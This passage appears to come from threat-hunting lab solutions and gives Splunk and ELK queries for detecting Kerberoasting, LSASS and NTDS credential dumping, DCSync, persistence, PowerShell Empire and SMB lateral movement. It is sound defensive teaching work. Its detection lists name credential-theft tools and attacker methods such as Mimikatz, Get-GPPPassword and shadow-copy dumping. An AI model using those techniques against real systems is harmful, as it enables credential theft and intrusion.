+4769 auditing service ticket requests. It ﬁlters for any ticket requests with encryption type
+constants equal to the values of vulnerable cipher suites. List of all encryption types can be
+found at [8]. All requests for tickets with these encryption types are displayed.
+
+How to Implement: Domain controllers can log Kerberos TGS service ticket requests (event
+4769) by conﬁguring Audit Kerberos Service Ticket Operations [8]. As the amount of these
+events can be quite high, ﬁltering for particular encryption types may also be applied to log
+forwarding.
+
+Known False Positives: Using older operating systems or services that do not support AES
+encryption types may create false positives. In such a case, the search needs to be modiﬁed to
+allow the particular encryption type to the speciﬁc service.
+
+     S02D02 - Excessive service ticket requests from one source
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4769 ServiceName != krbtgt
+| regex ServiceName != "\$$" | transaction IpAddress maxpause=5m maxevents=-1 | eval
+services=mvcount(ServiceName) | where services > 1 | eval Source=if(IpAddress=="::1",
+Computer, IpAddress) | table _time, host, Source, TargetUserName, services, ServiceName,
+TicketEncryptionType | sort - _time | rename _time AS "Time", host AS "Host", TargetUserName
+AS "Target Username", services AS "Number of Services", ServiceName AS "Service Name",
+TicketEncryptionType AS "Ticket Encryption" | convert ctime(Time)
+Requests for several di erent service names (not related to each other) within a short time
+period from a single account are suspicious. Even more so if weak encryption was used in the
+service tickets. This search may help to reveal such activities. Service ticket requests
+for krbtgt service and computer account service names (those ending with $) are ﬁltered out
+from the results. The search focuses on service accounts that were created for speciﬁc
+services. Subsequent events are grouped on the IpAddress ﬁeld by the transaction command.
+Number of services in each transaction is calculated to display only results where the number
+is higher than the one speciﬁed in the condition.
+
+How to Implement: Domain controllers can log Kerberos TGS service ticket requests (event
+4769) by conﬁguring Audit Kerberos Service Ticket Operations [8]. The search constant
+indicating the number of services needs to be tuned to the needs of a particular domain
+environment.
+
+Known False Positives: The assessment of whether services are related or not needs to be
+added to the search if possible. Otherwise it needs to be done manually by a security analyst.
+Narrowing the search for particular ticket encryption types may prevent false positives. This
+search may also be combined with detection search S02D01 which could help to prevent false
+positive detections.
+
+     S02D03 - Suspicious external service ticket requests
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4769 IpPort > 0 (IpPort <
+1024 OR (NOT (IpAddress=10.0.0.0/8 OR IpAddress=172.16.0.0/12 OR
+IpAddress=192.168.0.0/16 OR IpAddress=127.0.0.1 OR IpAddress=::1))) | table _time, host,
+IpAddress, IpPort, TargetUserName, ServiceName, TicketEncryptionType | sort - _time | rename
+_time AS "Time", host AS "Host", IpAddress AS Source, IpPort AS "Source Port", TargetUserName
+AS "Target Username", ServiceName AS "Service Name", TicketEncryptionType AS "Ticket
+Encryption" | convert ctime(Time)
+The above is due to the Source being logged improperly. There is no such activity in this lab's
+dataset.
+This search tracks service requests by examining the IP address and port number. Unusual
+values indicate the use of outbound connection for the service request, which is suspicious.
+The search examines the IpPort and IpAddress ﬁelds in events 4769. Port values under 1024 and
+any non-private IP addresses are those of interest. The search displays results whenever such
+values appear in the request, together with details about the requestor.
+How to Implement: Domain controllers can log Kerberos TGS service ticket requests (event
+4769) by conﬁguring Audit Kerberos Service Ticket Operations [8]. If there is a legitimate service
+using port beyond 1024 or external IP address, it needs to be whitelisted in the search.
+Known False Positives: None identiﬁed if whitelisting is done correctly.
+
+     S02D04 - Detecting Kerberoasting with a honeypot
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4769
+ServiceName=Honeypot01 | eval Source=if(IpAddress=="::1", Computer, IpAddress) | table
+_time, host, Source, TargetUserName, ServiceName, TicketEncryptionType| sort - _time |
+rename _time AS "Time", host AS "Host", TargetUserName AS "Target Username", ServiceName
+AS "Service Name", TicketEncryptionType AS "Ticket Encryption" | convert ctime(Time)
+
+This search uses a detection method for Kerberoasting based on a honeypot. Honeypot is a fake
+service account that is never really used in the environment, but it is set up to look like a
+legitimate service account with high privileges assigned. A service ticket requests for this
+account are only made by an adversary and will be revealed by this search. The search ﬁlters all
+events auditing service requests (4769) for ServiceName equal to the honeypot service account
+(Honeypot01). The search directly produces results that detect malicious TGS requests.
+How to Implement: Domain controllers can log Kerberos TGS service ticket requests (event
+4769) by conﬁguring Audit Kerberos Service Ticket Operations [8]. A fake account (in the search
+named as Honeypot01) needs to be created, and a fake SPN must be registered for it.
+Preferably, both account name and SPN should seem as legitimate as possible. The account
+can also be part of a fake administrator group (set AdminCount attribute to 1) to raise its
+attractivity for an attacker. More details about the implementation can be found at [9].
+
+Known False Positives: There should not be any false positives. There is no reason to request a
+service ticket for the honeypot service by a legitimate user.
+
+     S02D05 - Detecting Kerberoasting via PowerShell
+
+index="ad_hunting" source="WinEventLog:Microsoft-Windows-PowerShell/Operational"
+(EventCode=4103 OR EventCode=4104) | transaction Computer maxpause=15m maxevents=-1
+| eval raw=_raw | search [| inputlookup service_accounts.csv | eval raw="*" . account . "*" | ﬁelds
+raw] | where eventcount > 2 | table _time, Computer, eventcount | sort - _time | rename _time AS
+"Time", Computer AS "Host", eventcount AS "Number of Events" | convert ctime(Time)
+
+This search is provided for completeness' sake. It won't produce any results.
+
+This search detects attempts to manipulate with service accounts via PowerShell. PowerShell is
+a tool commonly used by attackers. The search may catch SPN scanning activity or successful
+acquisition of the service ticket hash. Computers that appear in the results of this search with
+an extensive amount of events are worth to investigate. The search is built on events
+from PowerShell Operational log. A transaction is created for all subsequent PowerShell events
+coming from a single workstation. A new ﬁeld named raw is created and assigned the entire raw
+event. This is a preparation for the full-text search used in the next step. The search looks for the
+occurrence of any service account in the raw data of the PowerShell events. The list of service
+accounts is provided by a lookup ﬁle service_accounts.csv. Only the transactions containing
+more suspicious events than the speciﬁed threshold are displayed in the results.
+
+Task 3. Hunt for Credential Dumping
+
+     S03D01 - Possible dump of lsass.exe (Sysmon events)
+
+index="ad_hunting" source="xmlwineventlog:microsoft-windows-sysmon/operational"
+EventCode=8 OR EventCode=10 NOT GrantedAccess=0x1400 NOT GrantedAccess=0x1000
+NOT GrantedAccess=0x100000 | where (TargetImage LIKE "%lsass.exe") |search NOT
+SourceImage="C:\\Windows\\system32\\wininit.exe" NOT
+SourceImage="C:\\Windows\\system32\\csrss.exe" | transaction host, SourceImage,
+SourceProcessId maxspan=15m | table _time, host, SourceImage, SourceProcessId,
+GrantedAccess | sort - _time | rename _time AS "Time", host AS "Host", SourceImage AS
+"Process", SourceProcessId AS "Process ID", GrantedAccess AS "Access Mask" | convert
+ctime(Time)
+This search detects possible dump of the LSASS process (lsass.exe) memory via Sysmon
+events. The process memory contains various credentials while the OS is running. To create a
+dump of the lsass.exe process Administrator or SYSTEM privileges are required,
+especially SeDebugPrivilege or SeTcbPrivilege [16]. These are the primary detection artifacts
+used in this search. It is essential to focus on processes that accessed lsass.exe with these
+privileges. The search is focusing on Sysmon events with event codes 10 (ProcessAccess) and 8
+(CreateRemoteThread). These events are logged when a process creates another process or
+thread. The search focuses on processes interacting with lsass.exe with access mask specifying
+higher privileges. This is achieved by whitelisting the low-privileged access masks. List of
+access masks can be found at [17]. It is possible to whitelist some processes that commonly
+access lsass.exe, such as wininit.exe. However, it is strongly recommended to specify the full
+path to the process, as the name and the location of the executable can be easily changed to
+look like a legitimate process. The transaction command is used to group accesses of the same
+process in a short period. Process name and ID are displayed for further investigation.
+
+How to Implement: Sysmon must be deployed and conﬁgured to log process
+accesses(event10), and optionally creation of remote threads (event 8). The logs must be
+ingested and parsed by using TA for Microsoft Sysmon [18]. Whitelisting of processes needs to
+be done carefully. Only full process paths should be whitelisted. Malicious processes may have
+their name spoofed to look like a legitimate process.
+
+Known False Positives: Some processes may need to access lsass.exe with higher privileges.
+Depending on the services used in the environment, these processes can be whitelisted to
+prevent false positives. Examples are common Windows processes or AV solution processes
+(e.g., Windows Defender).
+
+     S03D02 - Possible dump of lsass.exe (Windows events)
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4656 NOT
+AccessMask=0x1400 NOT AccessMask=0x1000 NOT AccessMask=0x100000 | where
+(ObjectName LIKE "%lsass.exe") | search NOT
+ProcessName="C:\\Windows\\system32\\lsass.exe" | transaction host, ProcessName,
+ProcessId maxspan=15m | table _time, host, ProcessName, ProcessId, AccessMask | sort -
+_time | rename _time AS "Time", host AS "Host", ProcessName AS "Process", ProcessId AS
+"Process ID", AccessMask AS "Access Mask" | convert ctime(Time)
+
+This search detects possible dump of the LSASS process (lsass.exe) memory via Windows
+events. The process memory contains various credentials while the OS is running. To create a
+dump of the lsass.exe process, Administrator or SYSTEM privileges are needed,
+especially SeDebugPrivilege or SeTcbPrivilege [16]. These are the primary detection artifacts
+used by the search. It is essential to focus on processes that accessed lsass.exe with these
+privileges. The search uses event 4656 (A handle to an object was requested). This event
+indicates that speciﬁc access was requested for an object [19]. Such an object can be
+the lsass.exe process. The same principle for whitelisting low privileged access masks and
+legitimate processes applies as in S03D01, with the exception that ﬁelds are named di erently.
+The transaction command is again used to group accesses of the same process in a short time,
+and the process name with ID is presented for further investigation.
+How to Implement: For event 4656 to be logged, auditing settings under Object
+Access category must be enabled [19]. Whitelisting of processes needs to be done carefully.
+Only full process paths should be whitelisted. Malicious processes may have their name
+spoofed to look like a legitimate process.
+Known False Positives: Some processes may need to access lsass.exe with higher privileges.
+Depending on the services used in the environment, some processes can be whitelisted to
+prevent false positives. Examples are common Windows processes or AV solution processes
+(e.g., Windows Defender).
+
+     S03D03 - Creation of a dump ﬁle
+index="ad_hunting" source="xmlwineventlog:microsoft-windows-sysmon/operational"
+EventCode=11 TargetFilename=*dmp | table _time, host, Image, ProcessId, TargetFilename |
+sort - _time | rename _time AS "Time", host AS "Host", Image AS "Process", ProcessId AS
+"Process ID", TargetFilename AS "Filename" | convert ctime(Time)
+A dump ﬁle may be created by using many di erent tools. Even the Task Manager utility
+integrated into Windows has this capability. Some programs will create a ﬁle with .dmp
+extension by default or would not allow changing the ﬁlename at all. This search hunts for the
+creation of such ﬁles. Sysmon event 11 allows monitoring creation of ﬁles together with the
+process that created them. It is enough to look for a ﬁlename ending with dmp and display
+related information for investigation.
+
+How to Implement: Sysmon must be deployed and conﬁgured to log ﬁle creation (event 11).
+The logs must be ingested and parsed by using TA for Microsoft Sysmon [18].
+
+Known False Positives: Dump ﬁles created for any process may trigger this rule. They can be
+created by administrators or developers for debugging purposes. In case this happens regularly,
+narrowing the search or whitelisting particular ﬁles may help to prevent false positives.
+
+     S03D04 - Installation of an unsigned driver
+index="ad_hunting" source="xmlwineventlog:microsoft-windows-sysmon/operational"
+EventCode=6 Signed=false | table _time, host, ImageLoaded, SHA1, SignatureStatus | sort -
+_time | rename _time AS "Time", host AS "Host", ImageLoaded AS "Image Loaded",
+SignatureStatus AS "Signature Status" | convert ctime(Time)
+
+Some tools used for credential dumping, such as Mimikatz [16], may attempt to install its own
+driver to the system. This search aims to detect such attempts by looking at the driver signature.
+It may also reveal suspicious installations of other drivers to the system beyond the scope of
+this story. Such events happening on critical systems are surely worth of investigation. The
+search looks for Sysmon event 6 (Driver loaded) with the value of ﬁeld Signed equal to false. By
+this, loading of unsigned drivers on the monitored systems can be spotted. Filename with path
+and hashes can be then used for investigation. Correlation search S03C04 can be used to gain
+more information.
+
+How to Implement: Sysmon must be deployed and conﬁgured to log loading of drivers (event
+6). The logs must be ingested and parsed by using TA for Microsoft Sysmon [18].
+
+Known False Positives The number of false positives depends on the usage of di erent software
+in the environment. Use of legitimate drivers can be logged and found by this search. If that is
+the case, whitelisting may be applied to prevent FP detections.
+     S03D05 - Access to GPP honeypot in SYSVOL
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=5145
+RelativeTargetName="*test.local\\Policies\\{12345}*" | transaction IpAddress, SubjectUserSid
+maxspan=5m maxevents=-1 | table _time, host, IpAddress, SubjectUserName, SubjectUserSid,
+SubjectLogonId | sort - _time | rename _time AS "Time", host AS "Host", IpAddress AS "Source
+IP", SubjectUserName AS "Username", SubjectUserSid AS "Account SID", SubjectLogonId AS
+"Logon ID" | convert ctime(Time)
+
+Group Policy Preferences can be used to distribute passwords across the domain. GPP data is
+stored in a domain-wide share SYSVOL, to which all Authenticated Users have read access.
+Therefore, SYSVOL is a common place for attackers to look for credentials. Such attempts can
+be detected by creating a honeypot (fake group policy with no e ective settings) and logging
+accesses to it. Any access to this ﬁle is suspicious, as there are no reasons to access it. [20]
+Windows event 5145 (A network share object was checked to see whether client can be granted
+desired access) will provide the desired information. The search ﬁlters these events to the
+honeypot policy ﬁle (ﬁeld RelativeTargetName) and displays information about the origin of the
+action. The transaction command is used to group multiple events from the same source in a
+short time to a single one.
+How to Implement: For event 5145 to be logged the Detailed File Share auditing setting must
+be enabled [21].
+A fake group policy needs to be created in SYSVOL and deny permissions needs to be set for it.
+For instance: policy test.local\Policies\{12345} and permissions Everyone:Deny. The policy ﬁle
+structure should look as legitimate as possible; the attacker should not suspect that the policy
+is a honeypot.
+Known False Positives: This rule should not trigger false positives, as there is no reason to
+access the ﬁle except its creation. However, vulnerability scanners may access the share and
+trigger the rule false-positively.
+
+     S03D06 - Possible credential database dumping
+index="ad_hunting" source="xmlwineventlog:security" EventCode=4688
+NewProcessName="*vssadmin.exe"
+NTDS.dit is the Active Directory database ﬁle, an obvious choice for attackers. There are many
+methods on how to gain access to this ﬁle. One of them is to create Volume Shadow Copy of a
+domain controller. It can be done either by a utility vssadmin.exe [22] or using WMI [23]. WMI
+can be invoked from PowerShell or by wmic.exe. Another method is to used ntdsutil.exe - a
+utility used to build a new domain controller faster [14]. Attackers may also use reg.exe to dump
+hives directly from Registry, where the SAM database is located. The rule detects usage of these
+methods by looking at command line parameters of newly created processes. The search takes
+events logging creation of new processes: Windows event 4688 (Sysmon event 1 is better) and
+ﬁlter for known binaries that can access NTDS.dit such as vssadmin.exe.
+
+How to Implement: Sysmon must be deployed and conﬁgured to log process creation (event
+1). The logs must be ingested and parsed by using TA for Microsoft Sysmon [18]. For event 4688
+to be logged, Audit Process Creation setting must be enabled. Furthermore, additional settings
+must be enabled to include command line parameters in the event [24].
+
+Known False Positives: Volume Shadow Copy Service can be used as a backup solution in the
+environment. Also, some of the tools included in this search can be used by administrators to
+perform their operations. In such cases, the search needs to be adjusted to whitelist those
+activities.
+
+     S03D07 - Possible dumping via DC synchronization
+
+index="ad_hunting" source="xmlwineventlog:security" EventCode=4662
+Properties="*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*" OR Properties="*1131f6ad-9c07-11d1-
+f79f-00c04fc2dcd2*" OR Properties="*1131f6ab-9c07-11d1-f79f-00c04fc2dcd2*"
+Caller_User_Name=Administrator
+Another method for gaining domain credentials is to abuse the Directory Replication Service
+Remote protocol used by domain controllers for replication of data. Mimikatz includes a feature
+DCSync[16],which e ectively "impersonates" a domain controller and requests account
+password data from a real domain controller [14]. This rule may help to hunt it. The search
+focuses onevent 4662 (An operation was performed on an object). This event contains
+ﬁeld Properties, which enables to determine the access rights used [25]. Therefore, the search
+ﬁlters events based on this ﬁeld to only those related to DC replication. Then, the Logon ID of
+the user should be taken from the results and correlated with an authentication event 4624 to
+see further details about the user session. Most importantly, to determine source workstation
+and IP address of the activity. The identiﬁed IP addresses from the correlation should be those
+of Domain Controllers, otherwise we are dealing with another endpoint/workstation that has
+been compromised by an attacker and is impersonating a Domain Controller.
+
+index="ad_hunting" EventCode=4624 0x107d67
+192.168.56.104 is a Win7 machine (see the accompanying thesis for the lab conﬁguration),
+certainly not a Domain Controller.
+
+How to Implement: The auditing setting Directory Service Access determines whether the
+operating system generates audit events when an Active Directory Domain Services (AD DS)
+object is accessed. This is necessary to log event 4662 [26]. A lookup ﬁle containing IP
+addresses of all domain controllers in the environment must be provided.
+
+Known False Positives: None identiﬁed yet.
+SPLUNK LAB 4
+
+Task 1. Hunt for WMI Persistence
+After researching through the provided technique and some of the references, including the
+proposed detection rule in Sigma, it appears that WMI persistence can be discovered by looking
+at WMI events that Sysmon captures in Event IDS 19, 20 and 21. With that in mind, we can
+perform a search for those events and display back to us concrete information if those events
+had occurred, such as what ﬁle is to be started. The ﬁnal query we construct is:
+index=winsysmon EventCode=19 OR EventCode=20 OR EventCode=21 | table _time,
+EventCode, EventDescription, Operation, Computer, Consumer, Query, Destination
+Once the query is executed, we get the following match:
+
+It appears that a new activity was observed, with the name "Updater", that triggers on the login
+of any users and executes the command "cmd.exe /c C:/programdata/updater.bat".
+Task 2. Hunt for Logon Scripts
+a. Hunting for logon scripts through process creation
+After researching provided resources, we discover that logon scripts are started by
+"userinit.exe". A detection rule is also provided in Sigma, which we can utilize to construct the
+following query:
+index=winsysmon ((ParentImage="*\\userinit.exe" NOT (Image="*\\explorer.exe")) NOT
+((CommandLine="*\\netlogon.bat" OR CommandLine="*\\UsrLogon.cmd"))) | stats
+values(cmdline) dc(Computer) AS hosts count by ParentImage Image
+Once executed, we get the following match:
+A logon script was executed on 1 host and the running image with its command line argument
+are present to reveal that batch script was executed in %ProgramData%.
+b. On the second hunt, utilizing the previously mentioned Sigma rule, we observe that Sysmon
+Event IDs (related to registry activity) 11, 12, 13 and 14 can be monitored if they had captured
+any activity towards the key UserInitMprLogonScripts. We therefore construct the following
+query:
+index=winsysmon ((EventCode="11" OR EventCode="12" OR EventCode="13" OR
+EventCode="14") AND TargetObject="*UserInitMprLogonScript*") | table Computer, EventCode,
+signature, TargetObject, Details
+Executing the query, we'll see a match that outlines the conﬁguration of the batch script
+executed in step a:
+
+Task 3. Hunt for Renamed PowerShell
+After reviewing the MITRE documentation and the following Sigma detection rule, we'll base our
+hunt on any started process that has description "Windows PowerShell" and is not
+powershell.exe or powershell_ise.exe. We then construct the following query:
+index=winsysmon EventCode=1 AND Description="Windows PowerShell" AND
+(Image!="*\\powershell.exe" AND Image!="*\\powershell_ise.exe") | rex ﬁeld=Hashes
+".*MD5=(?<MD5>[A-F0-9]*)," | table _time, Computer, User, Image, cmdline, ParentImage, MD5
+When executed, we get the following match:
+
+It appears that PowerShell was moved to ProgramData and renamed to "ssh.exe".
+Another beneﬁt of similar search to get a high level overview of the environment is to list all
+processes with description "Windows PowerShell", which will also show us the general usage of
+di erent PowerShell versions across the organization. To do that, we use the following query:
+index=winsysmon EventCode=1 AND Description="Windows PowerShell" | rex ﬁeld=Hashes
+".*MD5=(?<MD5>[A-F0-9]*)," | stats dc(Computer) AS Hostname count by Image MD5
+Description| sort -count
+After we execute the query, we'll see the following outcome:
+
+In our environment, only 1 PowerShell version has been executed, on a single host. The
+renamed PowerShell also appears to be the same version as the preinstalled PowerShell on the
+machine (although we cannot tell if it was executed for legitimate reasons in this view).
+Task 4. Hunt for PowerShell Empire
+As the name suggests, PowerShell Empire is using PowerShell on victim machines to run
+malicious activity. Since we have PowerShell logs available to us (Script-Block logging), we can
+use that to detect any malicious usage. Tom Ueltschi (renowned security researcher) proposed
+a detection rule that looks for any of the following 3 strings:
+
+     $psversiontable.psversion.major
+     system.management.automation.utils
+     system.management.automation.amsiutils
+Then, perform simple deobfuscation on the captured command and look for the occurrence of
+any of the following 5 strings:
+     EnableScriptBlockLogging
+     Enablescriptblockinvocationlogging
+     cachedgrouppolicysettings
+     ServerCertiﬁcateValidationCallback
+     expect100continue
+Finally, we construct the following query:
+index=* EventCode=4104 AND ($psversiontable.psversion.major OR
+system.management.automation.utils OR system.management.automation.amsiutils) | eval
+MessageDeobfuscated = replace(Message, "[ `'+\"\^]","") | search EnableScriptBlockLogging OR
+enablescriptblockinvocationlogging OR cachedgrouppolicysettings OR
+ServerCertiﬁcateValidationCallback OR expect100continue | table _time ComputerName Sid
+MessageDeobfuscated
+When executed, we get the following match:
+
+Let's look closer in the ﬁrst event:
+
+Task 5. Hunt for Unmanaged PowerShell
+As described in the course materials, Unmanaged PowerShell can be detected by looking at the
+Host Application when PowerShell starts and ﬁltering the "known goods" such as
+PowerShell.exe. We construct the following query:
+index=* hostapplication | rex ﬁeld=Message ".*HostApplication=(?<HostApplication>.*)" | search
+HostApplication!="*powershell*" HostApplication!="*\\sdiagnhost.exe*" | stats count by host
+HostApplication
+When executed, we get the following match:
+You can recall from Task 3, that we discovered ssh.exe to be an instance of renamed
+PowerShell.
+Task 6. Hunt for PowerShell Base64 encoded commands
+For this part, we'll use Sysmon event id 1, looking for command line arguments that would
+match those of an encoded command. The parameter that we are looking for is "-
+encodedcommand" but the bare minimum that PowerShell needs provided as arguments to
+threat it as an encoded command is simply "-e". So, let's ﬁlter out for event id 1, look for all
+powershell processes (powershell.exe or PowerShell in description), and parameter that
+contains "-e" (although we will tune this down slightly to avoid potential false positives). Initially,
+we'll list information related to the parent processes that were observed to be association with
+this activity -- the ﬁnal query is shown below:
+index=* EventCode=1 | eval cmdline =replace(cmdline, "-[Ee][Nn][Cc][Oo][Dd][Ii][Nn][Gg]",
+"__encoding") | search Image="*\\powershell.exe" (cmdline="* -enc*" OR cmdline="* -en *" OR
+cmdline="* -e *" OR cmdline="* -ec *") | table _time Computer User ParentImage
+ParentCommandLine
+Once executed, we receive the following output:
+
+Immediately, we'll note the entry executing "c:\ProgramData\UserInitMprLogonScript.bat"
+which is familiar to us from Task 2. The other entries appear suspicious for many reasons but for
+now, we'll focus on reviewing the actual command line that was ﬂagged. Let's modify the
+search:
+index=* EventCode=1 | eval cmdline =replace(cmdline, "-[Ee][Nn][Cc][Oo][Dd][Ii][Nn][Gg]",
+"__encoding") | search Image="*\\powershell.exe"
+(cmdline="* -enc*" OR cmdline="* -en *" OR cmdline="* -e *" OR cmdline="* -ec *") | table
+_time Computer User cmdline
+Executing the query, we'll get the following match:
+
+Task 7. Hunt for lateral movement through admin shares
+After researching through the provided technique and some of the references, the shares that
+we are interested in are C$, ADMIN$, and IPC$. Common tools that abuse these shares is some
+of PSExec's implementations - such as the one in Cobalt Strike. A distinctive characteristic is
+the connection back to the ADMIN$ share on localhost at 127.0.0.1 to execute a binary ﬁle
+which runs rundll32.exe. Taking that into account, we create the following query:
+index="winsysmon" EventCode=1 ParentImage=\\\\127.0.0.1\\ADMIN$\\*.exe AND
+Image=*\\rundll32.exe | table _time Computer User ParentImage Image
+Once executed, we get the following output:
+
+Task 8. Hunt for download of word documents
+To identify downloaded ﬁles, we'll utilize the fact that Windows sets alternate data streams
+"Zone.Identiﬁer" to recognize web content and alert the user of potentially dangerous ﬁle. To
+detect that, we'll use Sysmon ID 15 -- FileCreateStreamHash, speciﬁcally looking for ﬁles that
+contain ".doc". Our ﬁnal query is:
+index="winsysmon" EventCode=15 TargetFilename="*.doc.*" | table _time Computer Image
+TargetFilename MD5
+Once we execute it, we get the following:
+
+The image of browser_broker indicates that a browser downloaded the content (most likely the
+user visited a link).
+Task 9. Hunt for malicious Word document
+After reviewing the MITRE documentation and linking it to the title of task, we must be hunting
+for a malicious macro. Our query will simply list all processes that were spawned by
+winword.exe. The ﬁnal constructed query is:
+index="winsysmon" EventCode=1 ParentImage=*\\winword.exe | table _time Computer User
+Image ParentImage ParentCommandLine
+Once executed, we get:
+
+It seems that the document which was downloaded from the Internet (discovered in Task 8),
+was opened in Word, and spawned rundll32.exe. This is a highly suspicious activity.
+Task 10. Hunt for persistence in Registry Run keys
+After reviewing the MITRE documentation, our hunt will focus on Sysmon Event ID 13, and focus
+on activity associated with the registry path "\Windows\CurrentVersion\Run". The ﬁnal query
+constructed is:
+index="winsysmon" EventCode=13 "*\\Windows\\CurrentVersion\\Run*" | rex ﬁeld=Image
+".*\\\\(?<Image_EXE>[^\\\\]*)" | rex ﬁeld=TargetObject
+".*\\\\CurrentVersion\\\\(?<TargetObj_PATH>.*)" | strcat "Image=\"" Image_EXE "\",
+TargetObject=\"" TargetObj_PATH "\", Details=\"" Details "\"" Image_TargetObj_Details | stats
+dc(Computer) AS Clients values(Image_TargetObj_Details) count by EventDescription
+Image_EXE
+Once executed, we get the following:
+
+Immediately an entry stands out, which has occurred only once and executes a ﬁle in
+"ProgramData".
+Task 11. Hunt for Filesystem persistence
+After reviewing the MITRE documentation, the hunt we are performing focuses on processes
+started in the Startup location. We construct the following query:
+index="winsysmon" EventCode=1 Image="*\\Microsoft\\Windows\\Start
+Menu\\Programs\\Startup\\*" OR CommandLine="*\\Microsoft\\Windows\\Start
+Menu\\Programs\\Startup\\*" | table _time Computer User Image CommandLine MD5
+Once executed, we get the following:
+We discover that a batch script has been executed multiple times from that locations.
+Task 12. Hunt for internal recon
+After reviewing the provided resource, we discover a long list of binary ﬁles that are commonly
+used in performing internal recon to gather information. Our hunt will focus on whether 2 or
+more were executed within a time-frame of 15 minutes. We construct the following query:
+index="winsysmon" EventCode=1 Image=*\\ipconﬁg.exe OR Image=*\\net.exe OR
+Image=*\\whoami.exe OR Image=*\\netstat.exe OR Image=*\\nbtstat.exe OR
+Image=*\\hostname.exe OR Image=*\\tasklist.exe | bin _time span=15m | stats dc(Image) AS
+CNT_CMDS values(CommandLine) values(ParentCommandLine) count by _time Computer
+User | where CNT_CMDS > 2
+Once executed, we get the following output:
+
+Task 13. Hunt for suspicious VBS scripts
+After reviewing the provided resource and additional research, we discover that VBS scripts are
+executed by cscript.exe or wscript.exe. Using that with Sysmon Event ID 1, we'll search whether
+those binaries have executed, and if so, what scripts they executed. We construct the following
+query:
+index="winsysmon" EventCode=1 Image="*\\cscript.exe" OR Image="*\\wscript.exe" | rex
+ﬁeld=Image ".*\\\\(?<Image_fn>[^\\\\]*)" | rex ﬁeld=ParentImage
+".*\\\\(?<ParentImage_fn>[^\\\\]*)" | stats count by Computer User ProcessId Image
+CommandLine ParentImage ParentCommandLine
+Once executed, we get the following:
+
+We see that a script was executed running rom %PROGRAMDATA%.
+SPLUNK LAB 5
+
+Task 1. Have any ﬁles been transferred over SMB?
+To identify certain type of network tra ic, we'll utilize Zeek's logs. The ones we are interested in
+for this task are those with sourcetype of "zeek_ﬁles". Zeek logs will provide hashes for
+transferred ﬁles, so we should take this into account during our hunt as well. Utilizing that
+information, we construct the following query:
+index=zeek sourcetype="zeek_ﬁles" SMB | spath "rx_hosts{}" | table rx_hosts{}, tx_hosts{},
+ﬁlename, md5, sha1
+Once the query is executed, we get the following match:
+
+We can clearly see that some odd, 6 character and randomly named ﬁles were detected.
+We can further enrich this by looking at Zeek logs with sourcetype of "zeek_smb_ﬁles", and
+speciﬁcally those with action of "SMB::FILE_OPEN". We then construct the following query:
+index=zeek sourcetype=zeek_smb_ﬁles action="SMB::FILE_OPEN" | table id.resp_h, id.resp_p,
+id.orig_h, id.orig_p, action, name
+Once executed, we get the following match result:
+Now we can see that those ﬁles were accessed remotely. From this we can suspect that
+192.168.1.32 is the victim that connects to 192.168.1.34 on port 445.
+The 6 character and randomly-named ﬁlenames of shares are one of the distinguishing
+artefacts that is linked to CrackMapExec v4.0 and 5.0.
+Task 2. Has the suspected attacker machine connected to the victim?
+For this task, we'll use Zeek logs again, speciﬁcally those with sourcetype "zeek_ntlm". Simply,
+we will list all logs in a deﬁned table output format with the query:
+index=zeek sourcetype=zeek_ntlm | table id.resp_h, id.resp_p, id.orig_h, id.orig_p,
+domainname, success, username
+Once executed, we get the following:
+
+We can see that 192.168.1.34 has connected successfully to 192.168.1.32 with the account
+"Administrator" (NTLM authentication, which is often generated by connecting remotely over
+SMB with plain text password or performing pass the hash).
+Task 3. Have windows admin shares be accessed remotely?
+For this task again, we'll look again Zeek logs again, speciﬁcally those with sourcetype
+"zeek_smb_mapping". Simply, we will list all logs in a deﬁned table output format with the query:
+index=zeek sourcetype="zeek_smb_mapping" | table id.resp_h, id.resp_p, id.orig_h, id.orig_p,
+path, share_type
+Once executed, we get the following:
+It appears that 192.168.1.34 has created multiple connections to the IPC$ share of
+192.168.1.32. This is expected behavior when executing commands over SMB on a remote
+machine.
+Task 4. Has PowerShell Empire agent been executed on the victim machine?
+For this task, we'll utilize Sysmon logs, speciﬁcally whether a process was started with
+suspicious command line argument that contains "powershell.", which is generated by default in
+Empire agents. We will use the following query to search for "powershell":
+index=* powershell
+Once executed, among a list of matched events, we'll see this one:
+
+If we go forward and decode the obfuscated command, we will indeed note that this matches
+Empire's stager.
+We could also look into PowerShell ScriptBlock logs with Event ID 4104, that will display
+captured PowerShell activity. A simple query and looking for those that contain "Warning" in
+them already provides a wealth of potentially malicious obfuscated commands:
+Task 5. Hunt for self-signed certiﬁcates
+An interesting indicator of compromise is the existence of self-signed SSL certiﬁcates in your
+environment (of course your organization will have to adopt using certiﬁcates signed by trusted
+entities for this hunting technique to have a meaning)
+The below Splunk search can reveal self-signed SSL certiﬁcates or certiﬁcates with multiple
+empty ﬁelds. Both can be used as an alarm.
+index=zeek sourcetype=zeek_ssl |table cipher, curve, client_cert_chain_fuids, client_issuer,
+client_subject, C, version, subject, validation_status
+
+If you look carefully enough, you will identify that the self-signed certiﬁcate is related to the
+attacking host we found during the previous tasks!
+ELK LAB 1
+
+SOLUTIONS
+Below, you can ﬁnd solutions for each task. Remember though, that you can follow your own
+strategy, which may be di erent from the one explained in the following lab.
+Kali Machine
+
+Select logstash-2020.02.02 index
+Task 1. Perform a hunt for well-known PowerShell O ensive Frameworks and commands
+
+The information we are interested in is contained in the ScriptBlockText ﬁeld of event ID 4104.
+Therefore, to begin with, we set a ﬁlter in ELK for event ID 4104. We then proceed into
+constructing the following query after performing a search on popular PowerShell
+Frameworks/Commands:
+winlog.event_data.ScriptBlockText:(PowerUp OR Mimikatz OR NinjaCopy OR Get-
+ModiﬁablePath OR AllChecks OR AmsiBypass OR PsUACme OR Invoke-DLLInjection OR Invoke-
+ReﬂectivePEInjection OR Invoke-Shellcode OR Get-GPPPassword OR Get-Keystrokes OR Get-
+TimedScreenshot OR PowerView)
+Once executed, we receive the following output:
+
+Task 2. Perform a hunt for suspicious parent process spawning PowerShell
+For this task, we'll look into Sysmon's Process creation events, event id 1 so we start by ﬁltering
+out for those. Then we proceed with our research for identifying suspicious parent processes. To
+construct the following query with the data researched, we should remember that it will only be
